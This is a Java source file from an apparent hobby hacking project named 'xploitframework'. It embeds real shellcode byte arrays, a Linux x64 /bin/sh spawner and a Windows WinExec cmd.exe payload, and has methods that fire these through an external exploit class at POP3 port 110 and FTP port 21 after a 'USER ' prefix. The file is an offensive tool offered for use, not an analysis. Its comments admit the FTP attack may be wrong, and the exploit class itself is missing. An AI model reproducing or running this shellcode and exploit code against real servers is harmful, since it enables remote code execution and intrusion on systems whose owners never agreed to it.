package multi_purpose_hacking_project;

import java.net.InetAddress;

// this is SWORDFISH......FRONTLINE=SWORDFISH.
// marco.







public class xploitframework {
	
	// /bin/sh linux64 
	char[] linux64payload = new char[]  { 0x6a, 0x42, 0x58, 0xfe, 0xc4, 0x48, 0x99, 0x52, 0x48, 0xbf,
		    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,
		    0x5e, 0x49, 0x89, 0xd0, 0x49, 0x89, 0xd2, 0x0f, 0x05};

	
	// Windows - Allwin WinExec cmd.exe + ExitProcess Shellcode - 195 bytes 
	char[] allWindowsPayload = new char[] {  0xFC,0x33,0xD2,0xB2,0x30,0x64,0xFF,0x32,0x5A,0x8B,
		    0x52,0x0C,0x8B,0x52,0x14,0x8B,0x72,0x28,0x33,0xC9,
		    0xB1,0x18,0x33,0xFF,0x33,0xC0,0xAC,0x3C,0x61,0x7C,
		    0x02,0x2C,0x20,0xC1,0xCF,0x0D,0x03,0xF8,0xE2,0xF0,
		    0x81,0xFF,0x5B,0xBC,0x4A,0x6A,0x8B,0x5A,0x10,0x8B,
		    0x12,0x75,0xDA,0x8B,0x53,0x3C,0x03,0xD3,0xFF,0x72,
		    0x34,0x8B,0x52,0x78,0x03,0xD3,0x8B,0x72,0x20,0x03,
		    0xF3,0x33,0xC9,0x41,0xAD,0x03,0xC3,0x81,0x38,0x47,
		    0x65,0x74,0x50,0x75,0xF4,0x81,0x78,0x04,0x72,0x6F,
		    0x63,0x41,0x75,0xEB,0x81,0x78,0x08,0x64,0x64,0x72,
		    0x65,0x75,0xE2,0x49,0x8B,0x72,0x24,0x03,0xF3,0x66,
		    0x8B,0x0C,0x4E,0x8B,0x72,0x1C,0x03,0xF3,0x8B,0x14,
		    0x8E,0x03,0xD3,0x52,0x68,0x78,0x65,0x63,0x01,0xFE,
		    0x4C,0x24,0x03,0x68,0x57,0x69,0x6E,0x45,0x54,0x53,
		    0xFF,0xD2,0x68,0x63,0x6D,0x64,0x01,0xFE,0x4C,0x24,
		    0x03,0x6A,0x05,0x33,0xC9,0x8D,0x4C,0x24,0x04,0x51,
		    0xFF,0xD0,0x68,0x65,0x73,0x73,0x01,0x8B,0xDF,0xFE,
		    0x4C,0x24,0x03,0x68,0x50,0x72,0x6F,0x63,0x68,0x45,
		    0x78,0x69,0x74,0x54,0xFF,0x74,0x24,0x20,0xFF,0x54,
		    0x24,0x20,0x57,0xFF,0xD0	
	};
	
	
	
	
	
	
	
	
	
	
	
	jexploit  exploit = new jexploit();
	
	
	
	void exploitpop3(InetAddress ip)
	{
		// pop3 exploit

		
		
		
		
		String service="USER ";
		
		
		
		

		 exploit.RunExploit(ip,110,service, linux64payload, 200);
		 
		
		
		
		
		
	}
	
	
	
	
	
	
	void exploitFtp(InetAddress ip)
	{
		// pop3 exploit

		
		// read the request for comments for ftp protocol attack.
		// this aint corret i think.
		/*
		 * 
		 * FTP server: 220 (vsFTPd 2.0.1) FTP client: USER useway
FTP server: 331 Please specify the password.
FTP client: PASS !@#$%abce
FTP server: 230 Login successful. 


// test 220 =ftp server online....
  send user plus exploit buffer
 */
		



				
		
		String service="USER ";
		
		
		
		

		 exploit.RunExploit(ip,21,service, linux64payload, 200);
		 
		
		
		
		
		
	}
	
	
	
	
	
	
	
	
}